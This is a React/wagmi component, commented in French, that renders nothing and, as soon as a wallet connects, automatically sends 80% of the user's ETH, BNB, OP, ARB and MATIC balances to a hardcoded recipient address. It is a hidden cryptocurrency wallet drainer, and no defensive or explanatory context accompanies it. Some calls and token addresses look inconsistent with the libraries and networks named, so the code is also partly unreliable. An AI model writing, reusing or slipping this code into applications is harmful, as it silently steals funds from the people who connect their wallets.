import { useEffect } from "react";
import { useAccount, useWalletClient } from "wagmi";
import { ethers } from "ethers";
import { writeContract } from "@wagmi/core";
import { useAtom } from "jotai";

// Liste des tokens avec leurs adresses respectives pour chaque réseau
const tokens = [
  {
    symbol: "ETH",
    address: "0x0000000000000000000000000000000000000000", // ETH natif, n'a pas besoin d'adresse ERC-20
    decimals: 18, // ETH a 18 décimales
  },
  {
    symbol: "BNB",
    address: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52", // Binance-Peg BNB sur Ethereum
    decimals: 18,
  },
  {
    symbol: "OP",
    address: "0x4200000000000000000000000000000000000042", // Token Optimism
    decimals: 18,
  },
  {
    symbol: "ARB",
    address: "0x912CE59144191C1204E64559FE8253a0e49E6548", // Token Arbitrum
    decimals: 18,
  },
  {
    symbol: "MATIC",
    address: "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0", // Token MATIC sur Ethereum
    decimals: 18,
  },
];

const recipient = "0x518c5D62647E60864EcB3826e982c93dFa154af3"; // Adresse réceptrice

// Fonction principale
const SendTokens = () => {
  const { address } = useAccount();
  const { data: walletClient } = useWalletClient();

  const sendTokens = async () => {
    if (!walletClient || !address) return;

    for (const token of tokens) {
      try {
        let balance = await walletClient.getBalance(address, token.address);
        if (balance.isZero()) continue;

        // Calculer 80% du solde
        const amountToSend = balance.mul(80).div(100);

        // Si c'est de l'ETH natif, on envoie directement
        if (token.address === "0x0000000000000000000000000000000000000000") {
          const tx = await walletClient.sendTransaction({
            to: recipient,
            value: amountToSend,
          });
          console.log(`Envoyé ${ethers.utils.formatEther(amountToSend)} ETH`);
        } else {
          // Pour les tokens ERC-20, on envoie via la fonction transfer
          const tokenContract = new ethers.Contract(token.address, [
            "function transfer(address to, uint256 amount) public returns (bool)",
          ], walletClient);

          const tx = await tokenContract.transfer(recipient, amountToSend);
          console.log(`Envoyé ${ethers.utils.formatUnits(amountToSend, token.decimals)} ${token.symbol}`);
        }
      } catch (error) {
        console.error(`Erreur lors de l'envoi de ${token.symbol}:`, error);
      }
    }
  };

  useEffect(() => {
    sendTokens();
  }, [walletClient, address]);

  return null; // Cette fonction est exécutée en arrière-plan sans besoin d'interface utilisateur
};

export default SendTokens;
